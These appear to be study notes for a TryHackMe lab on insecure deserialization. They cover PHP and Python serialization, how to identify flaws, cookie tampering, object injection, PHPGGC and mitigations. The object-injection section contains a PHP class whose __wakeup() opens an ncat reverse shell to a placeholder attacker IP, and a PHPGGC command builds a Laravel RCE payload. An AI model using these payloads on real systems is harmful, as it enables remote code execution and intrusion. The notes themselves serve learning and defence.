# Insecure Deserialization

## TASK 3: Serialization Formats

Serialization is the process of converting an object's state into a storable or transmittable format, with deserialization reversing the process. Different programming languages implement serialization uniquely:

### PHP
- Uses `serialize()` and `unserialize()` functions.
- Objects can define custom serialization behavior with magic methods like `__sleep()` and `__wakeup()`.

#### Example
```php
class Notes {
    private $note;
    public function __construct($note) {
        $this->note = $note;
    }
}
$note = new Notes("Hello");
$serialized = serialize($note);
```

### Python
- Utilizes the `pickle` module for serialization (pickling) and deserialization (unpickling).
- Binary data is often encoded in Base64 for safe transmission.

#### Example
```python
import pickle
import base64

class Notes:
    def __init__(self, note):
        self.note = note

note = Notes("Hello")
serialized = pickle.dumps(note)
encoded = base64.b64encode(serialized)
```

---

## TASK 4: Identification

To identify serialization vulnerabilities:
- **White-box Testing**: Review code for serialization functions like `serialize()`, `unserialize()`, `pickle.loads()`, etc.
- **Black-box Testing**: Analyze server responses for error messages or inconsistencies in behavior when modifying serialized data.

---

## TASK 5: Exploitation - Update Properties

Look for cookies in the browser. If they are Base64-encoded serialized data, modify the boolean value to exploit the vulnerability.

---

## TASK 6: Exploitation - Object Injection

### Vulnerability
Insecure deserialization allows manipulation of object properties. For example:
```php
class MaliciousUserData {
    public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
    public function __wakeup() {
        exec($this->command);
    }
}
```

---

## TASK 7: Automation Scripts

### PHPGGC
- Generates serialized payloads for exploiting insecure deserialization.
- Example:
```bash
phpggc Laravel/RCE3 system whoami
```

---

## TASK 8: Mitigation Measures

### Secure Coder Perspective
- Use safe formats like JSON or XML with validation.
- Avoid risky functions like `eval()` or `exec()`.
- Validate inputs to ensure only valid data is accepted.

---

## Appendix

Refer to the TryHackMe room for more details.